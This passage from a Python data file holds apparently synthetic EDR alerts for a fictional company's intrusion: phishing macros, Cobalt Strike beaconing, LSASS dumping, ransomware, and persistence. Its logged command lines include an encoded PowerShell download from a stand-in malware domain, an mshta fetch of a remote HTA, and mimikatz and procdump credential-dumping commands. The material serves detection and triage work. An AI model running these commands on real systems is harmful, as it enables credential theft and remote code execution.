source_list = [
    "EDR", "XDR", "NDR", "IDS", "WAF", "DLP", "MAIL", "CLOUD", "IAM", "SIEM",
    "OT", "FIREWALL", "PROXY", "UEBA", "TI",
]

edr_alerts = [
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "alert_date": "2025-09-18T13:30:15Z",
        "tags": ["phishing", "office", "powershell"],
        "severity": "Medium",
        "reference": "Host FIN-WKS-JDOE-05 Word launched PowerShell",
        "description": "On host FIN-WKS-JDOE-05, a PowerShell process launched by WINWORD.EXE was detected, which is usually associated with macro viruses or phishing attacks.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "parent_process_name", "value": "winword.exe"},
            {"type": "parent_process_path", "value": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "process_path", "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            {"type": "command_line",
             "value": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlLmRvbWFpbi5jb20ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:30:14.582Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 6124,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -encodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlLmRvbWFpbi5jb20ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "parent_pid": 4820,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "alert_date": "2025-09-18T13:32:45Z",
        "tags": ["phishing", "office", "powershell"],
        "severity": "Medium",
        "reference": "Host FIN-WKS-JDOE-05 PowerShell launched by Word active again",
        "description": "On host FIN-WKS-JDOE-05, a PowerShell process launched by WINWORD.EXE with the same recent activity was detected again.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "parent_process_name", "value": "winword.exe"},
            {"type": "parent_process_path", "value": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "process_path", "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:32:44.912Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 6188,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -i -c whoami",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "parent_pid": 4820,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-21-CobaltStrike-Beacon-Detected",
        "rule_name": "Detected Cobalt Strike C2 Beacon",
        "alert_date": "2025-09-18T13:35:10Z",
        "tags": ["c2", "cobaltstrike"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 suspected C2 communication established",
        "description": "On host FIN-WKS-JDOE-05, a network connection initiated by powershell.exe process to known-bad.c2.server was detected, and the traffic characteristics match Cobalt Strike Beacon.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_port", "value": "443"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:35:09.776Z",
            "event_type": "NetworkConnection",
            "process_details": {
                "pid": 6188,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1"
            },
            "network_details": {
                "protocol": "TCP",
                "source_ip": "192.168.1.101",
                "source_port": 51234,
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "destination_domain": "known-bad.c2.server",
                "direction": "outbound"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Credential-Dumping-LSASS",
        "rule_name": "LSASS memory credential theft",
        "alert_date": "2025-09-18T14:05:25Z",
        "tags": ["lsass", "mimikatz", "credential-dumping"],
        "severity": "High",
        "reference": "Host SRV-DC-01 detected Mimikatz credential theft",
        "description": "On domain controller SRV-DC-01, a mimikatz.exe process accessing LSASS process memory was detected, which is a serious security threat.",
        "artifact": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "ip", "value": "10.10.1.5"},
            {"type": "username", "value": "administrator"},
            {"type": "process_name", "value": "mimikatz.exe"},
            {"type": "process_path", "value": "c:\\users\\administrator\\desktop\\tools\\mimikatz.exe"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "filehash_sha256", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dc01",
            "timestamp": "2025-09-18T14:05:24.123Z",
            "event_type": "LsassMemoryAccess",
            "process_details": {
                "pid": 3344,
                "path": "c:\\users\\administrator\\desktop\\tools\\mimikatz.exe",
                "command_line": "mimikatz.exe \"sekurlsa::logonpasswords\"",
                "hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
            },
            "target_process_details": {"pid": 720, "path": "c:\\windows\\system32\\lsass.exe"},
            "user_details": {"username": "administrator", "domain": "MYCORP"},
            "device_details": {"hostname": "SRV-DC-01", "ip_address": "10.10.1.5"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Credential-Dumping-LSASS",
        "rule_name": "LSASS memory credential theft",
        "alert_date": "2025-09-18T14:10:40Z",
        "tags": ["lsass", "procdump", "credential-dumping"],
        "severity": "High",
        "reference": "Host SRV-DC-01 detected Procdump dumping LSASS",
        "description": "On domain controller SRV-DC-01, a procdump.exe process dumping LSASS process memory was detected, which is a common credential theft technique.",
        "artifact": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "ip", "value": "10.10.1.5"},
            {"type": "username", "value": "administrator"},
            {"type": "process_name", "value": "procdump.exe"},
            {"type": "process_path", "value": "c:\\windows\\temp\\procdump.exe"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "filehash_sha256", "value": "d3e4f5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dc01",
            "timestamp": "2025-09-18T14:10:39.888Z",
            "event_type": "LsassMemoryAccess",
            "process_details": {
                "pid": 3512,
                "path": "c:\\windows\\temp\\procdump.exe",
                "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
                "hash_sha256": "d3e4f5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9"
            },
            "target_process_details": {"pid": 720, "path": "c:\\windows\\system32\\lsass.exe"},
            "user_details": {"username": "administrator", "domain": "MYCORP"},
            "device_details": {"hostname": "SRV-DC-01", "ip_address": "10.10.1.5"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Credential-Dumping-LSASS",
        "rule_name": "LSASS memory credential theft",
        "alert_date": "2025-09-18T14:15:00Z",
        "tags": ["lsass", "credential-dumping"],
        "severity": "High",
        "reference": "Host SRV-FILE-02 detected credential theft",
        "description": "On file server SRV-FILE-02, a suspicious process accessing LSASS process memory was detected.",
        "artifact": [
            {"type": "hostname", "value": "SRV-FILE-02"},
            {"type": "ip", "value": "10.10.2.18"},
            {"type": "username", "value": "administrator"},
            {"type": "process_name", "value": "dumpert.exe"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "filehash_sha256", "value": "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-files02",
            "timestamp": "2025-09-18T14:14:59.345Z",
            "event_type": "LsassMemoryAccess",
            "process_details": {
                "pid": 1980,
                "path": "c:\\temp\\dumpert.exe",
                "command_line": "dumpert.exe -p 720",
                "hash_sha256": "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
            },
            "target_process_details": {"pid": 720, "path": "c:\\windows\\system32\\lsass.exe"},
            "user_details": {"username": "administrator", "domain": "MYCORP"},
            "device_details": {"hostname": "SRV-FILE-02", "ip_address": "10.10.2.18"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-21-CobaltStrike-Beacon-Detected",
        "rule_name": "Detected Cobalt Strike C2 Beacon",
        "alert_date": "2025-09-18T14:40:15Z",
        "tags": ["c2", "cobaltstrike"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 continued C2 communication",
        "description": "On host FIN-WKS-JDOE-05, continuous outbound connections to the known Cobalt Strike server known-bad.c2.server were detected.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_ip", "value": "198.51.100.50"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T14:40:14.654Z",
            "event_type": "NetworkConnection",
            "process_details": {"pid": 6188, "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            "network_details": {
                "protocol": "HTTPS",
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "destination_domain": "known-bad.c2.server"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-21-CobaltStrike-Beacon-Detected",
        "rule_name": "Detected Cobalt Strike C2 Beacon",
        "tags": ["c2", "cobaltstrike"],
        "alert_date": "2025-09-18T14:42:20Z",
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 continued C2 communication",
        "description": "On host FIN-WKS-JDOE-05, another outbound connection to the known Cobalt Strike server known-bad.c2.server was detected.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_ip", "value": "198.51.100.50"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T14:42:19.998Z",
            "event_type": "NetworkConnection",
            "process_details": {"pid": 6188, "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            "network_details": {"protocol": "HTTPS", "destination_ip": "198.51.100.50", "destination_domain": "known-bad.c2.server"},
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "tags": ["phishing", "office", "mshta"],
        "alert_date": "2025-09-18T14:50:00Z",
        "severity": "Medium",
        "reference": "Host MKT-WKS-ASMITH-01 Excel launched mshta",
        "description": "On host MKT-WKS-ASMITH-01, a mshta.exe process launched by EXCEL.EXE was detected, which is a common malicious payload execution method.",
        "artifact": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "username", "value": "a.smith"},
            {"type": "parent_process_name", "value": "excel.exe"},
            {"type": "process_name", "value": "mshta.exe"},
            {"type": "command_line", "value": "mshta.exe http://phishing-site.com/loader.hta"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T14:49:59.123Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 7788,
                "path": "c:\\windows\\system32\\mshta.exe",
                "command_line": "mshta.exe http://phishing-site.com/loader.hta",
                "hash_sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
                "parent_pid": 5544,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\excel.exe"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "alert_date": "2025-09-18T14:51:30Z",
        "tags": ["phishing", "office", "mshta"],
        "severity": "High",
        "reference": "Host MKT-WKS-ASMITH-01 repeatedly detected Excel launching suspicious process",
        "description": "On host MKT-WKS-ASMITH-01, a mshta.exe process launched by EXCEL.EXE was detected again.",
        "artifact": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "username", "value": "a.smith"},
            {"type": "parent_process_name", "value": "excel.exe"},
            {"type": "process_name", "value": "mshta.exe"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T14:51:29.678Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 7810,
                "path": "c:\\windows\\system32\\mshta.exe",
                "command_line": "mshta.exe http://phishing-site.com/loader.hta",
                "hash_sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
                "parent_pid": 5544,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\excel.exe"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-01-Suspicious-PowerShell-Execution",
        "rule_name": "Suspicious PowerShell command execution",
        "alert_date": "2025-09-23T20:30:15Z",
        "tags": ["powershell", "code-execution", "fileless"],
        "severity": "High",
        "reference": "Host WKS-HR-03 executed encoded PowerShell command",
        "description": "On host WKS-HR-03, a Base64 encoded PowerShell command was detected. This technique is commonly used to evade signature detection and may be used to download or execute malicious scripts.",
        "artifact": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "command_line", "value": "powershell.exe -enc JABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABzAGUAbgBpAHQ..."}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T20:30:14.999Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 1234, "parent_pid": 5678, "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                             "command_line": "powershell.exe -enc JABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABzAGUAbgBpAHQ..."},
            "user_info": {"username": "j.smith", "domain": "MYCORP"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-02-Unusual-Network-Connection-to-External",
        "rule_name": "Unusual external network connection",
        "alert_date": "2025-09-23T20:35:40Z",
        "tags": ["network-connection", "c2", "data-exfiltration"],
        "severity": "High",
        "reference": "Host FIN-WKS-JDOE-05 connected to unusual external IP",
        "description": "Host FIN-WKS-JDOE-05 initiated a network connection to external IP address 185.22.67.123. This IP is not in the company whitelist and has been marked as malicious by threat intelligence.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "185.22.67.123"},
            {"type": "port", "value": 4444}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T20:35:39.876Z",
            "event_type": "NetworkConnection",
            "process_info": {"pid": 987, "path": "C:\\ProgramData\\updater.exe"},
            "network_info": {"protocol": "TCP", "dest_ip": "185.22.67.123", "dest_port": 4444, "action": "allow"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-03-Credential-Dumping-Attempt",
        "rule_name": "Credential dumping attempt",
        "alert_date": "2025-09-23T20:40:20Z",
        "tags": ["credential-theft", "mimikatz", "privilege-escalation"],
        "severity": "Critical",
        "reference": "Host WKS-HR-03 detected lsass.exe process access",
        "description": "A non-system process attempted to access the memory space of Windows Local Security Authority Subsystem Service (LSASS.exe). This behavior is characteristic of credential dumping tools such as Mimikatz.",
        "artifact": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "source_process", "value": "C:\\Program Files\\Tools\\dumper.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T20:40:19.444Z",
            "event_type": "ProcessAccess",
            "source_process": {"pid": 4321, "path": "C:\\Program Files\\Tools\\dumper.exe"},
            "target_process": {"pid": 555, "path": "C:\\Windows\\System32\\lsass.exe"},
            "access_rights": "PROCESS_QUERY_INFORMATION, PROCESS_VM_READ"
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-04-Ransomware-File-Activity",
        "rule_name": "Ransomware file activity",
        "alert_date": "2025-09-23T20:45:00Z",
        "tags": ["ransomware", "file-encryption", "mass-rename"],
        "severity": "Critical",
        "reference": "Host WKS-HR-03 experienced mass file renaming",
        "description": "Host WKS-HR-03 rapidly renamed large number of files and appended '.encrypted' extension in short time. This is typical ransomware encryption behavior.",
        "artifact": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "process_name", "value": "malware.exe"},
            {"type": "file_operations", "value": "250 file renames in 30 seconds"},
            {"type": "file_extension", "value": ".encrypted"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T20:44:59.123Z",
            "event_type": "FileActivity",
            "process_info": {"pid": 7777, "path": "C:\\temp\\malware.exe"},
            "file_details": {"type": "rename", "count": 250, "new_extension": ".encrypted"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-05-Suspicious-DLL-Load",
        "rule_name": "Suspicious DLL loading",
        "alert_date": "2025-09-23T20:50:30Z",
        "tags": ["dll-hijacking", "persistence", "code-execution"],
        "severity": "Medium",
        "reference": "Host SRV-PROD-01 loaded DLL from non-standard path",
        "description": "A legitimate process (services.exe) on host SRV-PROD-01 loaded a DLL file from non-standard or suspicious path (C:\\Temp). This may be a sign of DLL hijacking attack.",
        "artifact": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "parent_process", "value": "services.exe"},
            {"type": "loaded_dll", "value": "C:\\Temp\\malicious.dll"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T20:50:29.987Z",
            "event_type": "DllLoad",
            "process_info": {"pid": 111, "path": "C:\\Windows\\System32\\services.exe"},
            "dll_info": {"path": "C:\\Temp\\malicious.dll", "hash": "abc123def456"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-06-Reconnaissance-Tool-Execution",
        "rule_name": "Reconnaissance tool execution",
        "alert_date": "2025-09-23T20:55:10Z",
        "tags": ["reconnaissance", "scanning", "discovery"],
        "severity": "Low",
        "reference": "Host FIN-WKS-JDOE-05 executed IP scanning command",
        "description": "Command line on host FIN-WKS-JDOE-05 contained IP scanning related parameters. This indicates possible internal network reconnaissance activity.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "process_name", "value": "ping.exe"},
            {"type": "command_line", "value": "ping -n 1 192.168.1.1-254"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T20:55:09.111Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 2222, "path": "C:\\Windows\\System32\\ping.exe", "command_line": "ping -n 1 192.168.1.1-254"},
            "user_info": {"username": "j.doe", "domain": "MYCORP"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Unusual-Parent-Child-Process",
        "rule_name": "Unusual parent-child process relationship",
        "alert_date": "2025-09-23T21:00:30Z",
        "tags": ["process-anomaly", "code-execution", "fileless"],
        "severity": "High",
        "reference": "Word process launched cmd.exe",
        "description": "Microsoft Word (winword.exe) process created a command prompt (cmd.exe) process. This behavior is extremely unusual and typically indicates infection by a malicious document or macro virus.",
        "artifact": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "parent_process", "value": "winword.exe"},
            {"type": "child_process", "value": "cmd.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T21:00:29.876Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 3333, "parent_pid": 4444, "parent_path": "C:\\Program Files\\Microsoft Office\\WINWORD.exe",
                             "path": "C:\\Windows\\System32\\cmd.exe"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-08-New-User-Added-to-Admin-Group",
        "rule_name": "New user added to administrator group",
        "alert_date": "2025-09-23T21:05:00Z",
        "tags": ["privilege-escalation", "account-management"],
        "severity": "High",
        "reference": "Host IT-ADMIN-01 added new administrator user",
        "description": "Account 'j.doe' on host IT-ADMIN-01 added a new user 'temp_admin' to the local 'Administrators' group.",
        "artifact": [
            {"type": "hostname", "value": "IT-ADMIN-01"},
            {"type": "actor_account", "value": "j.doe"},
            {"type": "new_account", "value": "temp_admin"},
            {"type": "group_name", "value": "Administrators"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-it-01",
            "timestamp": "2025-09-23T21:04:59.000Z",
            "event_type": "LocalGroupChange",
            "user_info": {"username": "j.doe"},
            "group_info": {"group_name": "Administrators", "action": "add_user", "target_user": "temp_admin"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-09-Suspicious-Service-Creation",
        "rule_name": "Suspicious service creation",
        "alert_date": "2025-09-23T21:10:20Z",
        "tags": ["persistence", "service-creation", "malware"],
        "severity": "Medium",
        "reference": "Host SRV-PROD-01 created suspicious service",
        "description": "A new Windows service named 'MaliciousService' was created on host SRV-PROD-01 with its executable path pointing to a non-standard location.",
        "artifact": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "service_name", "value": "MaliciousService"},
            {"type": "service_path", "value": "C:\\Users\\Public\\malware.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:10:19.456Z",
            "event_type": "ServiceCreation",
            "process_info": {"pid": 5555, "path": "C:\\Windows\\System32\\sc.exe"},
            "service_info": {"name": "MaliciousService", "path": "C:\\Users\\Public\\malware.exe", "start_type": "auto"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-10-Mass-File-Deletion",
        "rule_name": "Mass file deletion",
        "alert_date": "2025-09-23T21:15:50Z",
        "tags": ["data-destruction", "denial-of-service"],
        "severity": "High",
        "reference": "Host FIN-WKS-JDOE-05 experienced mass file deletion",
        "description": "A process on host FIN-WKS-JDOE-05 deleted a large number of files in a short time, which may indicate data destruction or ransomware activity.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "process_name", "value": "eraser.exe"},
            {"type": "file_operations", "value": "500 file deletions in 1 minute"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T21:15:49.123Z",
            "event_type": "FileActivity",
            "process_info": {"pid": 6666, "path": "C:\\temp\\eraser.exe"},
            "file_details": {"type": "delete", "count": 500, "reason": "Unusual bulk deletion"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Registry-Run-Key-Modification",
        "rule_name": "Registry startup key modification",
        "alert_date": "2025-09-23T21:20:10Z",
        "tags": ["persistence", "registry"],
        "severity": "High",
        "reference": "Host IT-ADMIN-01 modified Run registry key",
        "description": "A process on host IT-ADMIN-01 added a new value to the HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key. This is a common technique for achieving persistence.",
        "artifact": [
            {"type": "hostname", "value": "IT-ADMIN-01"},
            {"type": "registry_key", "value": "HKLM\\...\\Run"},
            {"type": "registry_value", "value": "C:\\ProgramData\\backdoor.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-it-01",
            "timestamp": "2025-09-23T21:20:09.543Z",
            "event_type": "RegistryModification",
            "process_info": {"pid": 7890, "path": "C:\\temp\\tool.exe"},
            "registry_info": {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "C:\\ProgramData\\backdoor.exe", "action": "create"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-12-Suspicious-Process-Injection",
        "rule_name": "Suspicious process injection",
        "alert_date": "2025-09-23T21:25:00Z",
        "tags": ["process-injection", "code-execution", "evasion"],
        "severity": "Critical",
        "reference": "Host SRV-PROD-01 malicious injection activity",
        "description": "On host SRV-PROD-01, a suspicious process attempted to inject code into another legitimate process (such as svchost.exe). This technique is commonly used to evade detection.",
        "artifact": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "target_process", "value": "svchost.exe"},
            {"type": "source_process", "value": "C:\\Users\\Public\\malware.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:24:59.000Z",
            "event_type": "ProcessInjection",
            "source_process": {"pid": 8888, "path": "C:\\Users\\Public\\malware.exe"},
            "target_process": {"pid": 999, "path": "C:\\Windows\\System32\\svchost.exe"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-13-Unusual-Application-Start-Time",
        "rule_name": "Unusual application launch time",
        "alert_date": "2025-09-24T02:10:00Z",
        "tags": ["behavioral-anomaly", "after-hours", "compromised-account"],
        "severity": "Medium",
        "reference": "User a.smith launched finance application during non-business hours",
        "description": "User a.smith's account launched a finance application at 2 AM (outside normal business hours). This behavior is inconsistent with the user's normal behavior patterns.",
        "artifact": [
            {"type": "username", "value": "a.smith"},
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "process_name", "value": "FinanceApp.exe"},
            {"type": "time_of_day", "value": "02:10 AM"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-mkt-01",
            "timestamp": "2025-09-24T02:10:00.000Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 1122, "path": "C:\\Program Files\\Finance\\FinanceApp.exe"},
            "user_info": {"username": "a.smith"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-14-Mass-File-Access-to-Shares",
        "rule_name": "Bulk access to network share files",
        "alert_date": "2025-09-23T21:30:15Z",
        "tags": ["reconnaissance", "lateral-movement", "data-exfiltration"],
        "severity": "High",
        "reference": "Host IT-ADMIN-01 bulk accessed network shares",
        "description": "A process on host IT-ADMIN-01 accessed multiple network share folders in bulk within a short time. This typically indicates attacker internal network reconnaissance.",
        "artifact": [
            {"type": "hostname", "value": "IT-ADMIN-01"},
            {"type": "process_name", "value": "cmd.exe"},
            {"type": "accessed_shares", "value": ["\\fileshare\\HR", "\\fileshare\\Finance", "\\fileshare\\Eng"]}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-it-01",
            "timestamp": "2025-09-23T21:30:14.999Z",
            "event_type": "FileAccess",
            "process_info": {"pid": 4567, "path": "C:\\Windows\\System32\\cmd.exe", "command_line": "dir \\fileshare\\*"},
            "access_info": {"access_count": 50, "access_type": "read"}
        }
    },
    {
        "source": "EDR",
